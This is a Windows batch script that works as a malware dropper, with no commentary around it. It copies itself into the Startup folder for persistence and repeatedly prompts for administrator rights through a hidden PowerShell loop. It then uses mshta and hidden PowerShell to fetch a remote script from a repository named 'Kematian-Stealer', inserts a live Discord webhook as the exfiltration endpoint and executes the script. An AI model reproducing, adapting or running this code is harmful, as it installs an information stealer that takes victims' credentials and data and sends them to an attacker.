@echo off
cd /d "%~dp0"
copy "%~f0" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\fr.bat" >nul 2>&1
net session >nul 2>&1
if not %errorlevel% == 0 ( powershell -Win Hidden -NoP -ExecutionPolicy Bypass "while(1){try{Start-Process -Verb RunAs -FilePath '%~f0';exit}catch{}}" & exit )
del /f /q "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\fr.bat" >nul 2>&1
mshta vbscript:close(createobject("wscript.shell").run("powershell $ProgressPreference = 'SilentlyContinue';$t = Iwr -Uri 'https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/main.ps1' -UseBasicParsing; $t -replace 'YOUR_WEBHOOK_HERE', 'https://discord.com/api/webhooks/1244355770724782090/CbW_G_zcVVysPz4upOK7SYhj3ZmMc1RNb-o5bUtvqyPBtNezAQ9DW5ThL8Ps3ItXvA1K' | iex",0))